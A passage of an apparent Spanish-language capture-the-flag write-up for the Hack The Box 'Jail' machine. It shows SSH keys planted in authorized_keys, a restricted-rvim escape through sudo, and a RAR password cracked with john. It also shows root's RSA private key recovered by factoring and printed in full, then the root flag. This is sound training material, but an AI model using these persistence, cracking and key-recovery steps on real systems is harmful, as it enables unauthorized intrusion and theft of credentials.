+$ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCoVsroNxcMPxO1rDSFMPUNVBtw0uii8jHcl8OsBqiADThsloc6J8WkufZsXSTVk4kG8rl93l62aG5/aZTWhwt/25Qil8RMzidojUdDqvsA9t0ogNiSq1KvWs1J1Wh0wbKI34d+RoSc3oOU8ITvqtQIjL7Zr3j5eWqr2gnlhWouz1Lodt4OTJgKjSuO1rMu+JFxA3mpqZLtuiWOjp91gmGKP13oxO+ytlJclkJ0mWf4P3Zm1APZyoKN3GPeBOju+i3wdsimYdoipwBOI+LQ3+36wsZCrlmPVxjqho/NkboF74DaIw/Mr8Y0OchfY+3X5oHtiSdHq5fwV3qGbQwXQM3Kjho7Fo0yb27qyB8GggiGUSCsx8x9Fz53NHIlURd567P2RWJY1XQomCnuSzu6ugUri6VsA1IdsFAgZDRRWIy8hIfLviymCpZolAg2FJ5VXquvMOLTiwmwlyhXF1AVLCjUMkYrKTmxF8gp9hp9Nd1eHINX/rMRcdsJV8XKL44+6uM= root@kali' > authorized_keys
+```
+
+Para solucionar el error de conexión, creo unas nuevas claves pero utilizando este otro algoritmo
+
+```null
+debug1: Trying private key: /root/.ssh/id_ecdsa
+```
+
+```null
+ssh-keygen -t ecdsa -b 521
+```
+
+```null
+echo 'ecdsa-sha2-nistp521 AAAAE2VjZHNhLXNoYTItbmlzdHA1MjEAAAAIbmlzdHA1MjEAAACFBAEQ0ARj9cJ4bEdPvMoEwalVHH5RfOAdIlB5zkADRp5+eIbmSZrDIPCgBJgrihIAzttutCv/hPNsbbx120BKWXjoKwD69AO0VFP74CiPVaOscZz4iFHiCjCkpKgjz6gZJbcnDKre4Z252GrPp/aTtDHhKJ97nrdTeKGvldtc0pcbHkq/tQ== root@kali' > authorized_keys
+```
+
+```null
+ssh frank@10.10.10.34
+[frank@localhost ~]$ whoami
+frank
+```
+
+# Escalada
+
+Tengo otro privilegio a nivel de sudoers
+
+```null
+[frank@localhost ~]$ sudo -l
+Matching Defaults entries for frank on this host:
+    !visiblepw, always_set_home, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
+    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
+    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User frank may run the following commands on this host:
+    (frank) NOPASSWD: /opt/logreader/logreader.sh
+    (adm) NOPASSWD: /usr/bin/rvim /var/www/html/jailuser/dev/jail.c
+```
+
+Está restringido para ejecutar comandos
+
+<img src="/writeups/assets/img/Jail-htb/2.png" alt="">
+
+Pero se puede hacer un apaño con python
+
+<img src="/writeups/assets/img/Jail-htb/3.png" alt="">
+
+```null
+bash-4.2$ whoami
+adm
+```
+
+En su directorio personal hay un directorio ```.keys```
+
+```null
+bash-4.2$ ls -la
+total 4
+drwxr-x---.  3 root adm    19 Jul  3  2017 .
+drwxr-xr-x. 23 root root 4096 Mar  2 01:13 ..
+drwxr-x---.  3 root adm    52 Jul  3  2017 .keys
+```
+
+```null
+bash-4.2$ ls -la
+total 8
+drwxr-x---. 3 root adm  52 Jul  3  2017 .
+drwxr-x---. 3 root adm  19 Jul  3  2017 ..
+-rw-r-----. 1 root adm 475 Jul  3  2017 keys.rar
+drwxr-x---. 2 root adm  20 Jul  3  2017 .local
+-rw-r-----. 1 root adm 154 Jul  3  2017 note.txt
+```
+
+```null
+bash-4.2$ cat note.txt
+Note from Administrator:
+Frank, for the last time, your password for anything encrypted must be your last name followed by a 4 digit number and a symbol.
+```
+
+Transfiero el archivo ```keys.rar``` a mi equipo, convirtiéndolo a base64
+
+```null
+bash-4.2$ cat keys.rar | base64 -w 0
+```
+
+Está protegido por contraseña
+
+```null
+7z x file.rar
+
+7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,128 CPUs Intel(R) Core(TM) i7-10750H CPU @ 2.60GHz (A0652),ASM,AES-NI)
+
+Scanning the drive for archives:
+1 file, 475 bytes (1 KiB)
+
+Extracting archive: file.rar
+--
+Path = file.rar
+Type = Rar
+Physical Size = 475
+Solid = -
+Blocks = 1
+Multivolume = -
+Volumes = 1
+
+    
+Enter password (will not be echoed):
+```
+
+Dentro de ```.local``` hay un archivo en rot
+
+<img src="/writeups/assets/img/Jail-htb/4.png" alt="">
+
+Esto es una pista del apellido, que es Alcatraz. Este hombre se fugó de una prisión en 1962, por lo que ya tengo los 4 dígitos. El simbolo lo puedo bruteforcear
+
+```null
+python3
+Python 3.11.2 (main, Feb 12 2023, 00:48:52) [GCC 12.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import string
+>>> characters = string.punctuation
+>>> for character in characters:
+...     print("Morris1962" + character)
+... 
+Morris1962!
+Morris1962"
+Morris1962#
+Morris1962$
+Morris1962%
+Morris1962&
+Morris1962'
+Morris1962(
+Morris1962)
+Morris1962*
+Morris1962+
+Morris1962,
+Morris1962-
+Morris1962.
+Morris1962/
+Morris1962:
+Morris1962;
+Morris1962<
+Morris1962=
+Morris1962>
+Morris1962?
+Morris1962@
+Morris1962[
+Morris1962\
+Morris1962]
+Morris1962^
+Morris1962_
+Morris1962`
+Morris1962{
+Morris1962|
+Morris1962}
+Morris1962~
+```
+
+Creo un hash que corresponda al archivo y lo crackeo con ```john```
+
+```null
+rar2john file.rar > hash
+```
+
+```null
+john -w:/home/rubbx/Desktop/HTB/Machines/Jail/dictionary.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (rar, RAR3 [SHA1 256/256 AVX2 8x AES])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Morris1962!      (file.rar)     
+1g 0:00:00:00 DONE (2023-03-02 13:52) 8.333g/s 266.6p/s 266.6c/s 266.6C/s Morris1962!..Morris1962~
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+
+Extraigo su contenido
+
+```null
+rar e file.rar
+
+RAR 6.20   Copyright (c) 1993-2023 Alexander Roshal   17 Jan 2023
+Trial version             Type 'rar -?' for help
+
+
+Extracting from file.rar
+
+Enter password (will not be echoed) for rootauthorizedsshkey.pub: 
+
+
+Would you like to replace the existing file rootauthorizedsshkey.pub
+     0 bytes, modified on 2017-07-03 12:34
+with a new one
+   451 bytes, modified on 2017-07-03 12:34
+
+[Y]es, [N]o, [A]ll, n[E]ver, [R]ename, [Q]uit y
+
+Extracting  rootauthorizedsshkey.pub                                  OK 
+All OK
+```
+
+Dentro hay una clave pública
+
+```null
+-----BEGIN PUBLIC KEY-----
+MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKBgQYHLL65S3kVbhZ6kJnpf072
+YPH4Clvxj/41tzMVp/O3PCRVkDK/CpfBCS5PQV+mAcghLpSzTnFUzs69Ys466M//
+DmcIo1pJGKy8LDrwdpsSjVmvSgg39nCoOYMiAUVF0T0c47eUCmBloX/K8QjId6Pd
+D/qlaFM8B87MHZlW1fqe6QKBgQVY7NdIxerjKu5eOsRE8HTDAw9BLYUyoYeAe4/w
+Wt2/7A1Xgi5ckTFMG5EXhfv67GfCFE3jCpn2sd5e6zqBoKlHwAk52w4jSihdzGAx
+I85LArqOGc6QoVPS7jx5h5bK/3Oqm3siimo8O1BJ+mKGy9Owg9oZhBl28CfRyFug
+a99GCw==
+-----END PUBLIC KEY-----
+```
+
+Si se puede factorizar, puedo llegar a computar la privada
+
+Utilizo ```RSACTFTool```
+
+```null
+/opt/RsaCtfTool/RsaCtfTool.py --publickey rootauthorizedsshkey.pub --private
+
+Results for rootauthorizedsshkey.pub:
+
+Private key :
+-----BEGIN RSA PRIVATE KEY-----
+MIICOgIBAAKBgQYHLL65S3kVbhZ6kJnpf072YPH4Clvxj/41tzMVp/O3PCRVkDK/
+CpfBCS5PQV+mAcghLpSzTnFUzs69Ys466M//DmcIo1pJGKy8LDrwdpsSjVmvSgg3
+9nCoOYMiAUVF0T0c47eUCmBloX/K8QjId6PdD/qlaFM8B87MHZlW1fqe6QKBgQVY
+7NdIxerjKu5eOsRE8HTDAw9BLYUyoYeAe4/wWt2/7A1Xgi5ckTFMG5EXhfv67GfC
+FE3jCpn2sd5e6zqBoKlHwAk52w4jSihdzGAxI85LArqOGc6QoVPS7jx5h5bK/3Oq
+m3siimo8O1BJ+mKGy9Owg9oZhBl28CfRyFuga99GCwIgCMdb8cTpq+uOUyIK2Jrg
+PNxrCGF8HNhw8qT9jCez3aMCQQHBKGne1ibAwbqvPTd91cBUKfFYYIAY9a6/Iy56
+XnGBS35kpKZB7j5dMZxxOwPDowgZr9aGNAzcFAeCaP5jj3DhAkEDb4p9D5gqgSOc
+NXdU4KxzvZeBQn3IUyDbJ0J4pniHZzrYq9c6MiT1Z9KHfMkYGozyMd16Qyx4/Isf
+bc51aYmHCQIgCMdb8cTpq+uOUyIK2JrgPNxrCGF8HNhw8qT9jCez3aMCIAjHW/HE
+6avrjlMiCtia4DzcawhhfBzYcPKk/Ywns92jAkEBZ7eXqfWhxUbK7HsKf9IkmRRi
+hxnHNiRzKhXgV4umYdzDsQ6dPPBnzzMWkB7SOE5rxabZzkAinHK3eZ3HsMsC8Q==
+-----END RSA PRIVATE KEY-----
+```
+
+Pero tengo un error
+
+```null
+ssh -i id_rsa root@10.10.10.34
+sign_and_send_pubkey: no mutual signature supported
+root@10.10.10.34's password: 
+```
+
+Para solucionarlo basta con añadir un parámetro. Puedo ver la segunda flag
+
+```null
+ssh -i id_rsa root@10.10.10.34 -o 'PubkeyAcceptedKeyTypes=+ssh-rsa'
+[root@localhost ~]# cat /root/root.txt
+c1fe282531da6a15cb40d174b9dca79c
+```
